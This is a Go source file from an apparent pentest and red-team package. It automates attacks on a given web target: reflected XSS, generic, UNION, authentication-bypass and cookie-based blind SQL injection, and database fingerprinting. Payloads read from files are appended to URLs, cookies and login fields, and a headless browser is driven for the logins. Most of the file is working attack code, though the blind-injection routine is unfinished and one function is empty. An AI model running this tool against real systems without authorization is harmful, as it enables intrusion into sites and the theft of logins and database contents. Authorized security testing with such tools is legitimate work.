package pentestANDredteam

import (
	"bufio"
	"context"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	"github.com/chromedp/chromedp"
)

type AttackCredential struct {
	username string
	password string
}

func TargetStatusCustom(target string) bool {
	response, errorStatus := http.Get(target)

	if errorStatus != nil || response.StatusCode != http.StatusOK {
		return false
	}

	defer response.Body.Close()
	return true
}

func ReadPayload(fname string) ([]string, error) {
	var payload []string
	file, erroropen := os.Open(fname)

	if erroropen != nil {
		return nil, erroropen
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		payload = append(payload, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return payload, nil
}

func Login(content context.Context, credentials AttackCredential, target string) bool {
	timeoutContent, cancel := context.WithTimeout(content, 10*time.Second)
	defer cancel()
	var currentURL string

	loginError := chromedp.Run(timeoutContent,
		chromedp.Navigate(target),
		chromedp.SendKeys(`input[name="username"]`, credentials.username),
		chromedp.SendKeys(`input[name="password"]`, credentials.password),
		chromedp.Click(`button`),
		chromedp.WaitReady(`body`),
		chromedp.Location(&currentURL),
	)
	// Check for redirection
	if currentURL != target && loginError == nil {
		return true
	}
	return false
}

func DomainPath(target string) (string, string) {
	parsedURL, err := url.Parse(target)
	if err != nil {
		fmt.Println()
		fmt.Println("üíÄ Error Extracting Domain name. ‚ùå")
		fmt.Println()
	}

	domain := parsedURL.Hostname()
	path := parsedURL.Path
	return domain, path
}

func FindCred(content context.Context, target string) bool {
	timeOut, cancel := context.WithTimeout(content, 10*time.Second)
	defer cancel()
	var htmlContent string
	var found bool

	err := chromedp.Run(timeOut,
		chromedp.Navigate(target),
		chromedp.WaitVisible("body", chromedp.ByQuery),
		chromedp.OuterHTML("html", &htmlContent),
	)
	if err != nil {
		return false
	}

	found = strings.Contains(htmlContent, "administrator")
	return found
}

func FindCookie(target string) ([]string, *http.Response) {
	var collectedCookies []string
	URL := target
	responsing, _ := HTTPrequest(URL)

	// Extract cookies from the response headers
	cookies := responsing.Cookies()
	for _, cookie := range cookies {
		cookieString := cookie.Name + "=" + cookie.Value
		collectedCookies = append(collectedCookies, cookieString)
	}

	return collectedCookies, responsing
}

func ReplaceCookieSendPost(target string, trial string) int {
	// Send the initial GET request
	response, err := http.Get(target)
	if err != nil {
		// Handle the error as needed
		fmt.Printf("Error making GET request: %s\n", err)
		return 0
	}
	defer response.Body.Close()

	// Get the value of the "TrackingId" cookie from the response
	var updatedCookies []*http.Cookie
	for _, cookie := range response.Cookies() {
		if cookie.Name == "TrackingId" {
			updatedCookies = append(updatedCookies, &http.Cookie{
				Name:  cookie.Name,
				Value: trial,
			})
		} else {
			updatedCookies = append(updatedCookies, cookie)
		}
	}

	// Create a new request with the modified cookies
	request, err := http.NewRequest(http.MethodPost, target, nil)
	if err != nil {
		// Handle the error as needed
		fmt.Printf("Error creating POST request: %s\n", err)
		return 0
	}

	// Set the "Cookie" header with the updated cookies
	for _, cookie := range updatedCookies {
		request.AddCookie(cookie)
	}

	// Send the POST request using the same client as the GET request
	client := &http.Client{}
	postResponse, err := client.Do(request)
	if err != nil {
		// Handle the error as needed
		fmt.Printf("Error making POST request: %s\n", err)
		return 0
	}
	defer postResponse.Body.Close()

	// Read the response body to determine its length
	responseBody, err := ioutil.ReadAll(postResponse.Body)
	if err != nil {
		// Handle the error as needed
		fmt.Printf("Error reading POST response body: %s\n", err)
		return 0
	}

	return len(responseBody)
}

// Cross Site Script
func ReflectedXSS(target string, ignoring bool) string {
	foundOrNot := false

	if !TargetStatusCustom(target) && !ignoring {
		return "Can not connect to the target."
	}

	payload, payloaderror := ReadPayload("pentestANDredteam/payload/xss.txt")
	if payloaderror != nil {
		fmt.Printf("Error reading payload file: %s\n", payloaderror)
	}

	for _, trial := range payload {
		URL := target + trial
		if TargetStatusCustom(URL) {
			foundOrNot = true
			fmt.Printf("Attack Success: %s\n", URL)
		}
	}

	if foundOrNot {
		return "ü™≤ Found Reflected XSS bug"
	}
	return "‚ùå Reflected XSS bug not found"
}

func CrossSiteScript(passing *Scope) {
	stop := make(chan bool)
	reflected := make(chan string)

	fmt.Println("XSS Attack")
	fmt.Println("Start Reflected XSS Attack")

	go LoadingIcon(stop)
	go func() {
		reflected <- ReflectedXSS(passing.XSS.Target, passing.General.Ignore)
		stop <- true
	}()

	reflect := <-reflected

	fmt.Println(reflect)
}

// SQL Injection
func GenericSQLInjection(target string, ignoring bool) bool {
	foundOrNot := false

	fmt.Println("Start Generic SQL Injection")

	if !TargetStatusCustom(target) && !ignoring {
		fmt.Println("Can not connect to the target.")
		return false
	}

	payload, payloaderror := ReadPayload("pentestANDredteam/payload/SQL/genericSQL.txt")
	if payloaderror != nil {
		fmt.Printf("Error reading payload file: %s\n", payloaderror)
	}

	for _, trial := range payload {
		URL := target + trial
		if TargetStatusCustom(URL) {
			foundOrNot = true
			fmt.Printf("Attack Success: %s\n", URL)
		}
	}

	return foundOrNot
}

func AuthBypassSQLInjection(target string, ignoring bool) bool {
	foundOrNot := false
	response, errorStatus := http.Get(target)

	if errorStatus != nil || response.StatusCode != http.StatusOK {
		if !ignoring {
			fmt.Println("Can not connect to the target.")
			return false
		}
	}

	defer response.Body.Close()
	fmt.Println()
	fmt.Println("Target connected, start attacking...")
	fmt.Println("Start Auth Bypass SQL Injection")

	payload, payloaderror := ReadPayload("pentestANDredteam/payload/SQL/authSQL.txt")
	if payloaderror != nil {
		fmt.Printf("Error reading payload file: %s\n", payloaderror)
	}

	// start attack
	for _, trial := range payload {
		// create new session everytime so the cookies and csrf token would match
		newSession := context.Background()
		content, cancel := chromedp.NewContext(newSession)
		defer cancel()

		credentials := AttackCredential{
			username: trial,
			password: trial,
		}
		loginNoError := Login(content, credentials, target)
		if loginNoError {
			foundOrNot = true
			fmt.Println("Login Successful: ", trial)
		}
	}

	return foundOrNot
}

func UnionSQLInjection(target string, ignoring bool) bool {
	foundOrNot := false

	fmt.Println()
	fmt.Println("Start UNION SQL Injection")

	if !TargetStatusCustom(target) && !ignoring {
		fmt.Println("Can not connect to the target.")
		return false
	}

	fmt.Println()
	fmt.Println("Target connected, start attacking...")
	fmt.Println("Start finding regular UNION SQL Injection")
	fmt.Println()

	payload, payloaderror := ReadPayload("pentestANDredteam/payload/SQL/unionSQL.txt")
	if payloaderror != nil {
		fmt.Printf("Error reading payload file: %s\n", payloaderror)
	}

	for _, trial := range payload {
		URL := target + trial
		if TargetStatusCustom(URL) {
			foundOrNot = true
			fmt.Printf("Attack Success: %s\n", URL)
		}
	}

	fmt.Println("Start finding username and password.")

	if foundOrNot {
		fmt.Println()

		authPayload, authPayloaderror := ReadPayload("pentestANDredteam/payload/SQL/unionAuthSQL.txt")
		if authPayloaderror != nil {
			fmt.Printf("Error reading payload file: %s\n", authPayloaderror)
		}

		for _, trial := range authPayload {
			URL := target + trial
			if TargetStatusCustom(URL) {
				foundOrNot = true
				fmt.Printf("Attack Success: %s\n", URL)
			}
		}
		return true
	}

	fmt.Printf("UNION attack failed so will not try to find usename and password using UNION attack.")
	return false
}

func BlindSQLInjection(target string, ignoring bool) bool {
	foundOrNot := false

	testPayload, testPayloadError := ReadPayload("pentestANDredteam/payload/SQL/blindSQLtest.txt")
	if testPayloadError != nil {
		fmt.Printf("Error reading payload file: %s\n", testPayloadError)
	}

	for _, trial := range testPayload {
		ReplaceCookieSendPost(target, trial)
	}

	authPayload, authPayloadError := ReadPayload("pentestANDredteam/payload/SQL/blindSQLauth.txt")
	if authPayloadError != nil {
		fmt.Printf("Error reading payload file: %s\n", authPayloadError)
	}

	charaPayload, charaPayloadError := ReadPayload("pentestANDredteam/payload/characters.txt")
	if charaPayloadError != nil {
		fmt.Printf("Error reading payload file: %s\n", charaPayloadError)
	}

	responseLenCh := make(chan int)
	done := make(chan struct{})
	var diffLengthTrial string
	var diffResponseLen int

	go func() {
		responseLens := make(map[int]int)
		defer close(responseLenCh)
		defer close(done)

		for _, trial := range authPayload {
			for _, ch := range charaPayload {
				replacedTrial := strings.Replace(trial, "$", ch, -1)
				go func(trial string) {
					responseLen := ReplaceCookieSendPost(target, trial)
					responseLenCh <- responseLen
				}(replacedTrial)
			}
		}

		for responseLen := range responseLenCh {
			responseLens[responseLen]++
		}

		for responseLen, count := range responseLens {
			if count == 1 {
				diffResponseLen = responseLen
				break
			}
		}
	}()

	for _, trial := range authPayload {
		for count := 0; count < diffResponseLen; count++ {
			for _, ch := range charaPayload {
				replacedTrial := strings.Replace(trial, "$", ch, -1)
				responseLen := ReplaceCookieSendPost(target, replacedTrial)
				fmt.Printf("Trial: %s, Response Length: %d\n", replacedTrial, responseLen)
				/*
					if responseLen == diffResponseLen[count] {
						diffLengthTrial = replacedTrial
					}
				*/
			}
		}
	}

	fmt.Printf("Different Length Trial: %s, Response Length: %d\n", diffLengthTrial, diffResponseLen)

	return foundOrNot
}

func SQLdbVersion(target string, ignoring bool) bool {
	foundOrNot := false

	fmt.Println("Start Finding Database by SQL Injection")

	if !TargetStatusCustom(target) && !ignoring {
		fmt.Println("Can not connect to the target.")
		return false
	}

	payload, payloaderror := ReadPayload("pentestANDredteam/payload/unionSQL.txt")
	if payloaderror != nil {
		fmt.Printf("Error reading payload file: %s\n", payloaderror)
	}

	for _, trial := range payload {
		URL := target + trial
		if TargetStatusCustom(URL) {
			foundOrNot = true
			break
		}
	}

	if foundOrNot {
		dbPayload, dbPayloaderror := ReadPayload("pentestANDredteam/payload/SQLdb.txt")
		if dbPayloaderror != nil {
			fmt.Printf("Error reading payload file: %s\n", dbPayloaderror)
		}

		for _, trial := range dbPayload {
			URL := target + url.QueryEscape(trial)
			if TargetStatusCustom(URL) {
				fmt.Println(URL)
				fmt.Printf("Attack Success: %s\n", URL)
				return true
			}
		}
	}

	return false
}

func SQLdbInfo(target string, ignoring bool) bool {
	foundOrNot := false

	fmt.Println("Start Finding Database Information by SQL Injection")

	if !TargetStatusCustom(target) && !ignoring {
		fmt.Println("Can not connect to the target.")
		return false
	}

	payload, payloaderror := ReadPayload("pentestANDredteam/payload/SQL/unionSQL.txt")
	if payloaderror != nil {
		fmt.Printf("Error reading payload file: %s\n", payloaderror)
	}

	for _, trial := range payload {
		URL := target + trial
		if TargetStatusCustom(URL) {
			foundOrNot = true
			break
		}
	}

	if foundOrNot {
		foundOrNot = false
		oraclePayload, oraclePayloaderror := ReadPayload("pentestANDredteam/payload/SQL/oracle.txt")
		if oraclePayloaderror != nil {
			fmt.Printf("Error reading payload file: %s\n", oraclePayloaderror)
		}

		for _, trial := range oraclePayload {
			URL := target + trial
			if TargetStatusCustom(URL) {
				fmt.Printf("Attack Success: %s\n", URL)
				fmt.Println("This is Oracle!")
				println()
				foundOrNot = true
			}
		}

		microsoftPayload, microsoftPayloaderror := ReadPayload("pentestANDredteam/payload/SQL/microsoft.txt")
		if microsoftPayloaderror != nil {
			fmt.Printf("Error reading payload file: %s\n", microsoftPayloaderror)
		}

		for _, trial := range microsoftPayload {
			URL := target + trial
			if TargetStatusCustom(URL) {
				fmt.Printf("Attack Success: %s\n", URL)
				fmt.Println("This is Microsoft!")
				println()
				foundOrNot = true
			}
		}

		mySQLPayload, mySQLPayloaderror := ReadPayload("pentestANDredteam/payload/SQL/mySQL.txt")
		if mySQLPayloaderror != nil {
			fmt.Printf("Error reading payload file: %s\n", mySQLPayloaderror)
		}

		for _, trial := range mySQLPayload {
			URL := target + trial
			if TargetStatusCustom(URL) {
				fmt.Printf("Attack Success: %s\n", URL)
				fmt.Println("This is MySQL!")
				println()
				foundOrNot = true
			}
		}

		postgreSQLPayload, postgreSQLPayloaderror := ReadPayload("pentestANDredteam/payload/SQL/postgreSQL.txt")
		if postgreSQLPayloaderror != nil {
			fmt.Printf("Error reading payload file: %s\n", postgreSQLPayloaderror)
		}

		for _, trial := range postgreSQLPayload {
			URL := target + trial
			if TargetStatusCustom(URL) {
				fmt.Printf("Attack Success: %s\n", URL)
				fmt.Println("This is PostgreSQL!")
				println()
				foundOrNot = true
			}
		}
	}

	if foundOrNot {
		return true
	}

	return false
}

func SQLInjection(passing *Scope) {
	stop := make(chan bool)
	dbVersion := make(chan bool)
	dbInfo := make(chan bool)
	generic := make(chan bool)
	auth := make(chan bool)
	union := make(chan bool)
	blind := make(chan bool)

	fmt.Println("Start SQL Injection Attack")

	go LoadingIcon(stop)
	go func() {
		dbVersion <- SQLdbVersion(passing.SQLInjection.Target, passing.General.Ignore)
		dbInfo <- SQLdbInfo(passing.SQLInjection.Target, passing.General.Ignore)
		generic <- GenericSQLInjection(passing.SQLInjection.Target, passing.General.Ignore)
		auth <- AuthBypassSQLInjection(passing.SQLInjection.Target, passing.General.Ignore)
		union <- UnionSQLInjection(passing.SQLInjection.Target, passing.General.Ignore)
		blind <- BlindSQLInjection(passing.SQLInjection.Target, passing.General.Ignore)
		stop <- true
	}()

	dbVersionResult := <-dbVersion
	dbInfoResult := <-dbInfo
	genericResult := <-generic
	authResult := <-auth
	unionResult := <-union
	blindResult := <-blind

	if dbVersionResult {
		fmt.Println("üëå Found Database Version")
	} else {
		fmt.Println("üëé Database Version not found")
	}

	if dbInfoResult {
		fmt.Println("üëå Found Database Information")
	} else {
		fmt.Println("üëé Database Information not found")
	}

	if genericResult {
		fmt.Println("ü™≤ Found Generic SQL Injection bug")
	} else {
		fmt.Println("‚ùå Generic SQL Injection bug not found")
	}
	if authResult {
		fmt.Println("ü™≤ Found Auth Bypass SQL Injection bug")
	} else {
		fmt.Println("‚ùå Auth Bypass SQL Injection bug not found")
	}
	if unionResult {
		fmt.Println("ü™≤ Found UNION SQL Injection bug")
	} else {
		fmt.Println("‚ùå UNION SQL Injection bug not found")
	}

	if blindResult {
		fmt.Println("ü™≤ Found Blind SQL Injection bug")
	} else {
		fmt.Println("‚ùå UNION Blind Injection bug not found")
	}
}

func CSS(passing *Scope) {

}
